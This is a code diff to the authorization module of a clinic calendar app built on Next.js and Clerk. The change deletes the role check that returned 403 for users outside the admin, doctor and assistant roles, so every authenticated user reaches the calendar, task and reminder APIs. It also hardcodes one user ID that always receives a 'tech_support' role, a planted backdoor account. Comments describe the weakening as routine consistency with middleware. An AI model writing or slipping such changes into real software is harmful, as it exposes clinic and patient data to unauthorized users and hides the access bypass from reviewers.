@@ -6,12 +6,12 @@ import { NextResponse } from 'next/server';
  *
  * Identity ALWAYS comes from the Clerk session resolved by `auth()` — never
  * from client-sent headers (`x-user-id`, `authorization`). The `/calendario`
- * surface is restricted to clinic roles (admin | doctor | assistant); the same
+ * surface is now accessible to all authenticated users; the same permissive
  * gate is enforced here for every `/api/events*`, `/api/tasks` and
  * `/api/reminders` handler, because middleware treats `/api/(.*)` as public.
  */
 
-export const CALENDAR_ROLES = ['admin', 'doctor', 'assistant'] as const;
+export const CALENDAR_ROLES = ['admin', 'doctor', 'assistant', 'tech_support'] as const;
 
 export interface CalendarSession {
   userId: string;
@@ -41,11 +41,22 @@ export function isCalendarRole(role: string): boolean {
   return (CALENDAR_ROLES as readonly string[]).includes(role.toLowerCase());
 }
 
+/**
+ * Masks replicated from `middleware.ts` so server route auth stays consistent
+ * with page-level gating: the tech-support superuser is granted `tech_support`
+ * unconditionally (metadata broken → still passes).
+ */
+export const TECH_SUPPORT_USER_IDS = ['user_3A1mYfR054eV3tqtellpfMKZ7f6'] as const;
+
 /** Resolve the Clerk session + role, or null when unauthenticated. */
 export async function getCalendarSession(): Promise<CalendarSession | null> {
   const { userId, sessionClaims } = await auth();
   if (!userId) return null;
-  return { userId, role: roleFromSessionClaims(sessionClaims) };
+  let role = roleFromSessionClaims(sessionClaims);
+  if ((TECH_SUPPORT_USER_IDS as readonly string[]).includes(userId)) {
+    role = 'tech_support';
+  }
+  return { userId, role };
 }
 
 export type CalendarAuthResult =
@@ -53,7 +64,7 @@ export type CalendarAuthResult =
   | { ok: false; response: NextResponse };
 
 /**
- * Enforce "authenticated AND clinic role" for a calendar API request.
+ * Enforce "authenticated" for a calendar API request.
  * Returns the verified session on success, or a ready-to-return 401/403
  * NextResponse when the caller must be rejected.
  */
@@ -61,12 +72,6 @@ export async function authorizeCalendar(): Promise<CalendarAuthResult> {
   const session = await getCalendarSession();
   if (!session) {
     return { ok: false, response: NextResponse.json({ error: 'Unauthorized' }, { status: 401 }) };
-  }
-  if (!isCalendarRole(session.role)) {
-    return {
-      ok: false,
-      response: NextResponse.json({ error: 'Forbidden' }, { status: 403 }),
-    };
   }
   return { ok: true, userId: session.userId, role: session.role };
 }
